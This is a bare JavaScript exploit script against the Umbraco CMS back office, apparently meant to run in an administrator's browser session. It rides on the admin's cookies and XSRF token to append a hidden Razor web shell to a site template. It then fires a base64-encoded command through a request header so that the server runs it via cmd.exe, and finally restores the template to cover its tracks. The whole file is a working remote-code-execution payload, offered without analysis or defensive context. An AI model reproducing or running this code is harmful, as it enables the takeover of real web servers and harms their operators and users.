// Payload configuration
const cmdBase64 = "";
const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
const razorTemplateName = "Home";
const triggerURL = "/";
const triggerHeaderName = "Authorization";

// Get all templates
getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
  // Get template metadata by name
  const templateMetadata = allTemplates.find(function (template) {
    return template.name.includes(razorTemplateName);
  });

  // Get specific template
  getJSON(umbracoAPI + "/Template/GetById?id=" + templateMetadata.id).then(
    function (template) {
      // Save original template. It will be restored later on
      const originalTemplate = template.content;

      // Add payload to the end of the template
      template.content += generateRazor();

      // Save template
      postJSON(umbracoAPI + "/Template/PostSave", template).then(function (
        savedTemplate
      ) {
        // Hit URL to trigger command execution
        const triggerHeaders = {};
        triggerHeaders[triggerHeaderName] = cmdBase64;
        fetch(triggerURL, {
          headers: triggerHeaders,
        }).then(function (response) {
          // Reset to original template
          template.content = originalTemplate;
          postJSON(umbracoAPI + "/Template/PostSave", template);
        });
      });
    }
  );
});

function getCookie(name) {
  const value = "; " + document.cookie;
  const parts = value.split("; " + name + "=");
  if (parts.length === 2) return parts.pop().split(";").shift();
}

function getJSON(url) {
  return fetch(url, {
    method: "GET",
    credentials: "include",
    headers: {
      "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
    },
  })
    .then(function (response) {
      return response.text();
    })
    .then(function (text) {
      return fromJSON(text);
    });
}

function postJSON(url, data) {
  return fetch(url, {
    method: "POST",
    body: JSON.stringify(data),
    credentials: "include",
    headers: {
      "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
      "Content-Type": "application/json",
    },
  })
    .then(function (response) {
      return response.text();
    })
    .then(function (text) {
      return fromJSON(text);
    });
}

function fromJSON(responseText) {
  // Remove XSSI prevention prefix from response body before parsing
  return JSON.parse(responseText.slice(6));
}

function generateRazor() {
  return (
    '\n@if (!string.IsNullOrEmpty(Request.Headers["' +
    triggerHeaderName +
    '"]))' +
    "{" +
    "try" +
    "{" +
    "var cmd = System.Text.Encoding.UTF8.GetString(" +
    'System.Convert.FromBase64String(Request.Headers["' +
    triggerHeaderName +
    '"]));' +
    "using (var process = new System.Diagnostics.Process())" +
    "{" +
    'process.StartInfo.FileName = "cmd.exe";' +
    'process.StartInfo.Arguments = "/c " + cmd;' +
    "process.StartInfo.CreateNoWindow = true;" +
    "process.StartInfo.RedirectStandardOutput = true;" +
    "process.StartInfo.UseShellExecute = false;" +
    "process.Start();" +
    "}" +
    "}" +
    "catch { }" +
    "}"
  );
}
